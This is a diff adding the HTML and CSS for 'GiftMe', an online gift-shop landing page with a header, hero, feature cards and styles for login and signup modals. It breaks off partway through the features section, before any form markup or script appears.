@@ -1,0 +1,2622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GiftMe - Perfect Gifts for Every Occasion</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect x='20' y='30' width='60' height='50' rx='5' ry='5' fill='%23e91e63'/><rect x='35' y='20' width='30' height='15' fill='%239c27b0'/><rect x='47' y='10' width='6' height='15' fill='%23ff4081'/><rect x='25' y='35' width='15' height='15' fill='%23ffffff' opacity='0.7'/><rect x='45' y='35' width='15' height='15' fill='%23ffffff' opacity='0.7'/><rect x='25' y='55' width='15' height='15' fill='%23ffffff' opacity='0.7'/><rect x='45' y='55' width='15' height='15' fill='%23ffffff' opacity='0.7'/></svg>" type="image/svg+xml">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary: #e91e63;
+            --primary-dark: #c2185b;
+            --secondary: #9c27b0;
+            --accent: #ff4081;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --gray: #6c757d;
+            --light-gray: #e9ecef;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+            overflow-x: hidden;
+            width: 100%;
+            min-height: 100vh;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        button {
+            cursor: pointer;
+            border: none;
+            outline: none;
+            transition: var(--transition);
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 12px 24px;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            text-align: center;
+            transition: var(--transition);
+            white-space: nowrap;
+        }
+
+        .btn-primary {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: var(--box-shadow);
+        }
+
+        .btn-secondary {
+            background-color: var(--secondary);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            background-color: #7b1fa2;
+            transform: translateY(-2px);
+            box-shadow: var(--box-shadow);
+        }
+
+        .btn-outline {
+            background-color: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .btn-outline:hover {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        /* Header Styles */
+        header {
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            width: 100%;
+        }
+
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+            width: 100%;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
+            white-space: nowrap;
+        }
+
+        .logo i {
+            font-size: 28px;
+        }
+
+        nav {
+            display: flex;
+            align-items: center;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 25px;
+        }
+
+        nav a {
+            font-weight: 500;
+            transition: var(--transition);
+            position: relative;
+            white-space: nowrap;
+        }
+
+        nav a:hover {
+            color: var(--primary);
+        }
+
+        nav a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background-color: var(--primary);
+            transition: var(--transition);
+        }
+
+        nav a:hover::after {
+            width: 100%;
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: var(--light-gray);
+            border-radius: 30px;
+            padding: 8px 15px;
+        }
+
+        .search-bar input {
+            background: transparent;
+            border: none;
+            outline: none;
+            width: 200px;
+            padding: 5px;
+        }
+
+        .search-bar i {
+            color: var(--gray);
+        }
+
+        .user-actions {
+            display: flex;
+            gap: 15px;
+        }
+
+        .user-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--light-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: var(--transition);
+            flex-shrink: 0;
+        }
+
+        .user-icon:hover {
+            background-color: var(--primary);
+            color: white;
+        }
+
+        .mobile-menu-btn {
+            display: none;
+            font-size: 24px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            padding: 80px 0;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgMTIwMCA4MDAiIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0icmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA1KSI+PHBhdGggZD0iTTAgNDAwYzAtMTEwLjQgODkuNi0yMDAgMjAwLTIwMHM0MDAgODkuNiA0MDAgMjAwLTg5LjYgMjAwLTIwMCAyMDBTMCA1MTAuNCAwIDQwMHoiLz48cGF0aCBkPSJNMTIwMCA0MDBjMC0xMTAuNC04OS42LTIwMC0yMDAtMjAwcy00MDAgODkuNi00MDAgMjAwIDg5LjYgMjAwIDIwMCAyMDBzMjAwLTg5LjYgMjAwLTIwMHoiLz48L2c+PC9zdmc+');
+            opacity: 0.2;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+            width: 100%;
+        }
+
+        .hero-text {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .hero-text h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            line-height: 1.2;
+            word-wrap: break-word;
+        }
+
+        .hero-text p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            max-width: 500px;
+            word-wrap: break-word;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .hero-image {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            min-width: 0;
+            position: relative;
+        }
+
+        .hero-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            animation: float 6s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        /* Floating Elements */
+        .floating-elements {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .floating-element {
+            position: absolute;
+            width: 50px;
+            height: 50px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            animation: floatAround 15s linear infinite;
+        }
+
+        .floating-element:nth-child(1) {
+            top: 20%;
+            left: 10%;
+            animation-delay: 0s;
+            width: 30px;
+            height: 30px;
+        }
+
+        .floating-element:nth-child(2) {
+            top: 60%;
+            left: 80%;
+            animation-delay: 2s;
+            width: 40px;
+            height: 40px;
+        }
+
+        .floating-element:nth-child(3) {
+            top: 80%;
+            left: 20%;
+            animation-delay: 4s;
+            width: 25px;
+            height: 25px;
+        }
+
+        .floating-element:nth-child(4) {
+            top: 30%;
+            left: 70%;
+            animation-delay: 6s;
+            width: 35px;
+            height: 35px;
+        }
+
+        @keyframes floatAround {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(20px, 20px) rotate(90deg); }
+            50% { transform: translate(0, 40px) rotate(180deg); }
+            75% { transform: translate(-20px, 20px) rotate(270deg); }
+            100% { transform: translate(0, 0) rotate(360deg); }
+        }
+
+        /* Features Section */
+        .features {
+            padding: 80px 0;
+            background-color: white;
+            width: 100%;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+            width: 100%;
+        }
+
+        .section-title h2 {
+            font-size: 36px;
+            color: var(--dark);
+            margin-bottom: 15px;
+            word-wrap: break-word;
+        }
+
+        .section-title p {
+            color: var(--gray);
+            max-width: 600px;
+            margin: 0 auto;
+            word-wrap: break-word;
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 30px;
+            width: 100%;
+        }
+
+        .feature-card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            padding: 30px;
+            text-align: center;
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .feature-card:hover::before {
+            left: 100%;
+        }
+
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            background-color: var(--light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: var(--primary);
+            font-size: 28px;
+            transition: var(--transition);
+        }
+
+        .feature-card:hover .feature-icon {
+            background-color: var(--primary);
+            color: white;
+            transform: rotateY(180deg);
+        }
+
+        .feature-card h3 {
+            margin-bottom: 15px;
+            font-size: 22px;
+            word-wrap: break-word;
+        }
+
+        .feature-card p {
+            color: var(--gray);
+            word-wrap: break-word;
+        }
+
+        /* Categories Section */
+        .categories {
+            padding: 80px 0;
+            background-color: var(--light);
+            width: 100%;
+        }
+
+        .categories-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            width: 100%;
+        }
+
+        .category-card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
+            position: relative;
+            width: 100%;
+        }
+
+        .category-card:hover {
+            transform: translateY(-5px);
+        }
+
+        .category-image {
+            height: 200px;
+            background-color: var(--light-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 50px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .category-image i {
+            transition: var(--transition);
+        }
+
+        .category-card:hover .category-image i {
+            transform: scale(1.2);
+        }
+
+        .category-content {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .category-content h3 {
+            margin-bottom: 10px;
+            word-wrap: break-word;
+        }
+
+        .category-content p {
+            color: var(--gray);
+            font-size: 14px;
+            word-wrap: break-word;
+        }
+
+        /* Products Section */
+        .products {
+            padding: 80px 0;
+            background-color: white;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 30px;
+            width: 100%;
+        }
+
+        .product-card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            overflow: hidden;
+            box-shadow: var(--box-shadow);
+            transition: var(--transition);
+            width: 100%;
+            position: relative;
+        }
+
+        .product-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        .product-image {
+            height: 220px;
+            background-color: var(--light-gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            font-size: 60px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .product-image i {
+            transition: var(--transition);
+        }
+
+        .product-card:hover .product-image i {
+            transform: scale(1.1);
+        }
+
+        .product-badge {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background-color: var(--primary);
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .product-content {
+            padding: 20px;
+        }
+
+        .product-category {
+            color: var(--gray);
+            font-size: 14px;
+            margin-bottom: 5px;
+            word-wrap: break-word;
+        }
+
+        .product-title {
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+            word-wrap: break-word;
+        }
+
+        .product-rating {
+            color: #ffc107;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .product-price {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .current-price {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .original-price {
+            font-size: 16px;
+            color: var(--gray);
+            text-decoration: line-through;
+        }
+
+        .product-actions {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .product-actions .btn {
+            flex: 1;
+            padding: 10px;
+            font-size: 14px;
+            min-width: 120px;
+        }
+
+        /* Auto-scrolling Products */
+        .auto-scroll-container {
+            position: relative;
+            width: 100%;
+            overflow: hidden;
+            margin: 50px 0;
+        }
+
+        .auto-scroll-track {
+            display: flex;
+            width: calc(280px * 20);
+            animation: scroll 40s linear infinite;
+        }
+
+        .auto-scroll-track:hover {
+            animation-play-state: paused;
+        }
+
+        .auto-scroll-item {
+            width: 280px;
+            margin-right: 30px;
+            flex-shrink: 0;
+        }
+
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(calc(-280px * 10)); }
+        }
+
+        /* Testimonials Section */
+        .testimonials {
+            padding: 80px 0;
+            background-color: var(--light);
+            width: 100%;
+        }
+
+        .testimonials-slider {
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            width: 100%;
+        }
+
+        .testimonial-card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            padding: 30px;
+            text-align: center;
+            box-shadow: var(--box-shadow);
+            width: 100%;
+            position: relative;
+        }
+
+        .testimonial-card::before {
+            content: '"';
+            position: absolute;
+            top: 10px;
+            left: 20px;
+            font-size: 60px;
+            color: var(--primary);
+            opacity: 0.2;
+            font-family: Georgia, serif;
+        }
+
+        .testimonial-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: var(--light-gray);
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: var(--primary);
+        }
+
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 20px;
+            color: var(--dark);
+            word-wrap: break-word;
+        }
+
+        .testimonial-author {
+            font-weight: 600;
+            color: var(--primary);
+            word-wrap: break-word;
+        }
+
+        /* CTA Section */
+        .cta {
+            padding: 80px 0;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            text-align: center;
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            word-wrap: break-word;
+        }
+
+        .cta p {
+            max-width: 600px;
+            margin: 0 auto 30px;
+            font-size: 18px;
+            word-wrap: break-word;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--dark);
+            color: white;
+            padding: 60px 0 20px;
+            width: 100%;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+
+        .footer-column h3 {
+            font-size: 18px;
+            margin-bottom: 20px;
+            position: relative;
+            padding-bottom: 10px;
+            word-wrap: break-word;
+        }
+
+        .footer-column h3::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 40px;
+            height: 2px;
+            background-color: var(--primary);
+        }
+
+        .footer-links {
+            list-style: none;
+        }
+
+        .footer-links li {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: #adb5bd;
+            transition: var(--transition);
+            word-wrap: break-word;
+        }
+
+        .footer-links a:hover {
+            color: white;
+            padding-left: 5px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .social-links a {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: var(--transition);
+            flex-shrink: 0;
+        }
+
+        .social-links a:hover {
+            background-color: var(--primary);
+            transform: translateY(-3px);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #adb5bd;
+            font-size: 14px;
+            width: 100%;
+        }
+
+        /* Login Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-y: auto;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: var(--border-radius);
+            width: 100%;
+            max-width: 400px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 24px;
+            cursor: pointer;
+            color: var(--gray);
+            z-index: 1;
+        }
+
+        .modal-title {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: var(--dark);
+            word-wrap: break-word;
+        }
+
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: var(--gray);
+            width: 100%;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: var(--light-gray);
+        }
+
+        .divider span {
+            padding: 0 15px;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 12px 15px;
+            margin-bottom: 15px;
+            border: 1px solid var(--light-gray);
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .login-form input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.1);
+        }
+
+        .login-form .forgot-password {
+            text-align: right;
+            display: block;
+            margin-bottom: 20px;
+            color: var(--primary);
+            font-size: 14px;
+            word-wrap: break-word;
+        }
+
+        /* Signup Modal */
+        .signup-modal .modal-content {
+            max-width: 500px;
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+            width: 100%;
+            flex-wrap: wrap;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+            color: var(--dark);
+            word-wrap: break-word;
+        }
+
+        .card-details {
+            background-color: var(--light);
+            padding: 20px;
+            border-radius: var(--border-radius);
+            margin: 20px 0;
+            width: 100%;
+        }
+
+        .card-details h4 {
+            margin-bottom: 15px;
+            color: var(--dark);
+            word-wrap: break-word;
+        }
+
+        .promo-section {
+            background-color: #f0f8ff;
+            padding: 15px;
+            border-radius: var(--border-radius);
+            margin: 15px 0;
+            border-left: 3px solid var(--primary);
+            width: 100%;
+        }
+
+        .promo-section h4 {
+            margin-bottom: 10px;
+            color: var(--dark);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            word-wrap: break-word;
+        }
+
+        .promo-section p {
+            font-size: 14px;
+            color: var(--gray);
+            margin-bottom: 10px;
+            word-wrap: break-word;
+        }
+
+        .card-row {
+            display: flex;
+            gap: 15px;
+            width: 100%;
+            flex-wrap: wrap;
+        }
+
+        .card-row .form-group {
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .card-row .form-group:last-child {
+            flex: 0.5;
+            min-width: 80px;
+        }
+
+        .verification-note {
+            background-color: #e7f3ff;
+            padding: 10px 15px;
+            border-radius: var(--border-radius);
+            margin: 15px 0;
+            font-size: 14px;
+            color: #0066cc;
+            border-left: 3px solid #0066cc;
+            width: 100%;
+            word-wrap: break-word;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+            width: 100%;
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Page Content Styles */
+        .page-content {
+            padding: 80px 0;
+            min-height: 60vh;
+            width: 100%;
+        }
+
+        .page-header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .page-header h1 {
+            font-size: 42px;
+            color: var(--dark);
+            margin-bottom: 15px;
+        }
+
+        .page-header p {
+            color: var(--gray);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* Protected Content Styles */
+        .protected-content {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .protected-content.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Form Styles */
+        .form-container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 40px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--light-gray);
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.1);
+        }
+
+        .form-footer {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .form-footer a {
+            color: var(--primary);
+            font-weight: 500;
+        }
+
+        /* Auth Pages */
+        .auth-page {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            padding: 40px 20px;
+        }
+
+        .auth-container {
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .auth-header {
+            text-align: center;
+            margin-bottom: 30px;
+            color: white;
+        }
+
+        .auth-header h1 {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .auth-header p {
+            opacity: 0.9;
+        }
+
+        /* Error Styles */
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .input-error {
+            border-color: #dc3545 !important;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1) !important;
+        }
+
+        /* Page Swapping Animations */
+        .page-swap-container {
+            position: relative;
+            width: 100%;
+            height: 400px;
+            overflow: hidden;
+            margin: 50px 0;
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+        }
+
+        .page-swap-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            text-align: center;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+
+        .page-swap-content.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .page-swap-content h3 {
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
+
+        .page-swap-content p {
+            font-size: 18px;
+            margin-bottom: 25px;
+            max-width: 600px;
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 1200px) {
+            .container {
+                padding: 0 15px;
+            }
+        }
+
+        @media (max-width: 992px) {
+            .hero-content {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .hero-text p {
+                margin: 0 auto 30px;
+            }
+
+            .hero-buttons {
+                justify-content: center;
+            }
+            
+            .hero-text h1 {
+                font-size: 40px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .mobile-menu-btn {
+                display: block;
+            }
+
+            nav {
+                position: fixed;
+                top: 70px;
+                left: 0;
+                width: 100%;
+                background-color: white;
+                box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+                padding: 20px;
+                transform: translateY(-100%);
+                opacity: 0;
+                visibility: hidden;
+                transition: var(--transition);
+                z-index: 999;
+            }
+
+            nav.active {
+                transform: translateY(0);
+                opacity: 1;
+                visibility: visible;
+            }
+
+            nav ul {
+                flex-direction: column;
+                gap: 15px;
+                width: 100%;
+            }
+
+            .search-bar {
+                display: none;
+            }
+
+            .hero-text h1 {
+                font-size: 36px;
+            }
+
+            .section-title h2 {
+                font-size: 30px;
+            }
+            
+            .hero {
+                padding: 60px 0;
+            }
+            
+            .features, .categories, .products, .testimonials, .cta {
+                padding: 60px 0;
+            }
+            
+            .form-container {
+                padding: 30px 20px;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .hero-buttons {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+            
+            .logo {
+                font-size: 20px;
+            }
+            
+            .logo i {
+                font-size: 24px;
+            }
+            
+            .user-actions {
+                gap: 10px;
+            }
+            
+            .hero-text h1 {
+                font-size: 32px;
+            }
+            
+            .section-title h2 {
+                font-size: 26px;
+            }
+            
+            .feature-card, .category-card, .product-card {
+                padding: 20px;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 30px;
+            }
+            
+            .auth-header h1 {
+                font-size: 28px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            .container {
+                padding: 0 10px;
+            }
+            
+            .hero-text h1 {
+                font-size: 28px;
+            }
+            
+            .section-title h2 {
+                font-size: 24px;
+            }
+            
+            .product-actions {
+                flex-direction: column;
+            }
+            
+            .header-container {
+                padding: 10px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container header-container">
+            <div class="logo">
+                <i class="fas fa-gift"></i>
+                <span>GiftMe</span>
+            </div>
+            
+            <nav id="main-nav">
+                <ul>
+                    <li><a href="/" data-page="home">Home</a></li>
+                    <li><a href="/gifts" data-page="gifts">Gifts</a></li>
+                    <li><a href="/occasions" data-page="occasions">Occasions</a></li>
+                    <li><a href="/categories" data-page="categories">Categories</a></li>
+                    <li><a href="/about" data-page="about">About</a></li>
+                    <li><a href="/contact" data-page="contact">Contact</a></li>
+                </ul>
+            </nav>
+            
+            <div class="header-actions">
+                <div class="search-bar">
+                    <input type="text" placeholder="Search for gifts...">
+                    <i class="fas fa-search"></i>
+                </div>
+                
+                <div class="user-actions">
+                    <a href="/login" class="user-icon" id="login-btn">
+                        <i class="fas fa-user"></i>
+                    </a>
+                    <div class="user-icon" id="cart-btn">
+                        <i class="fas fa-shopping-cart"></i>
+                    </div>
+                </div>
+                
+                <div class="mobile-menu-btn" id="mobile-menu-btn">
+                    <i class="fas fa-bars"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Home Page Content (Default) -->
+    <div id="home-page" class="protected-content active">
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="floating-elements">
+                <div class="floating-element"></div>
+                <div class="floating-element"></div>
+                <div class="floating-element"></div>
+                <div class="floating-element"></div>
+            </div>
+            <div class="container hero-content">
+                <div class="hero-text">
+                    <h1>Find the Perfect Gift for Every Occasion</h1>
+                    <p>GiftMe helps you discover and send thoughtful gifts that make every moment special. From birthdays to anniversaries, we've got you covered.</p>
+                    <div class="hero-buttons">
+                        <a href="/gifts" class="btn btn-primary">Explore Gifts</a>
+                        <a href="/about" class="btn btn-outline">How It Works</a>
+                    </div>
+                </div>
+                <div class="hero-image">
+                    <img src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80" alt="Beautifully wrapped gifts">
+                </div>
+            </div>
+        </section>
+
+        <!-- Features Section -->
+        <section class="features">
+            <div class="container">
+                <div class="section-title">
+                    <h2>Why Choose GiftMe?</h2>
+                    <p>We make gift-giving simple, personal, and memorable with our unique approach</p>
+                </div>
+                
+                <div class="features-grid">
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-lightbulb"></i>
+                        </div>
+                        <h3>Personalized Suggestions</h3>
+                        <p>Get gift ideas tailored to the recipient's interests and personality.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-shipping-fast"></i>
+                        </div>
+                        <h3>Fast Delivery</h3>
+                        <p>We deliver gifts quickly, often within 24 hours in major cities.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
+                            <i class="fas fa-gift"></i>
+                        </div>
+                        <h3>Beautiful Packaging</h3>
+                        <p>Every gift comes with elegant wrapping and a personalized note.</p>
+                    </div>
+                    
+                    <div class="feature-card">
+                        <div class="feature-icon">
